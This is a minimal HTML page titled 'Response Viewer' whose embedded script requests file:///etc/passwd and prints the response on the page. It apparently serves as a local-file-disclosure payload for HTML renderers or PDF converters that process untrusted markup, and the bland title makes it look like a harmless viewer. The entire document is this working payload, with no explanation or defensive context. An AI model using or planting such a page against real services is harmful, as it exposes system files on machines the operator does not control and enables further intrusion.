<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Response Viewer</title>
</head>
<body>

<pre id="output">Loading...</pre>

<script>
const x = new XMLHttpRequest();

x.onload = function () {
    document.getElementById("output").textContent = this.responseText;
};

x.onerror = function () {
    document.getElementById("output").textContent = "Request failed";
};

x.open("GET", "file:///etc/passwd");
x.send();
</script>

</body>
</html>
